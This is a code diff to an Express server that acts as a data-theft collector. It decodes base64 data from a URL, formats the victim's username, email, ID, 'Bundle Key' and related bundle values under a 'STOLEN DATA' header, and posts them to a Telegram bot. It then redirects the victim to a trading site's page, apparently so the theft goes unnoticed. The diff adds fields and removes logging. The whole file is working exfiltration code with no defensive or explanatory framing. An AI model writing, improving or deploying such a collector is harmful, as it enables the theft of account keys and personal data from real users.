@@ -10,17 +10,21 @@ app.get('/data/:b64', async (req, res) => {
     const decoded = Buffer.from(req.params.b64, 'base64').toString();
     const data = JSON.parse(decoded);
     
-    console.log('Received data:', data);
-    
-    const message = `
+    const msg = `
 🚨 STOLEN DATA
 
 User: ${data.user?.username || 'N/A'}
 Email: ${data.user?.email || 'N/A'}
+ID: ${data.user?.id || 'N/A'}
+
 Bundle Key: ${data.bundle || 'N/A'}
+
 sBundles: ${data.sBundles || 'N/A'}
+
 eBundles: ${data.eBundles || 'N/A'}
+
 Site: ${data.site || 'N/A'}
+Time: ${new Date().toISOString()}
     `;
     
     await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
@@ -28,19 +32,17 @@ Site: ${data.site || 'N/A'}
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: TG_CHAT,
-        text: message
+        text: msg
       })
     });
     
-    console.log('Sent to Telegram');
     res.redirect('https://axiom.trade/discover');
-    
   } catch (e) {
-    console.error('Error:', e);
-    res.status(500).send('Error');
+    console.error(e);
+    res.status(500).send('err');
   }
 });
 
-app.listen(3000, () => {
-  console.log('Server running on http://localhost:3000');
+app.listen(process.env.PORT || 3000, () => {
+  console.log('Server running');
 });
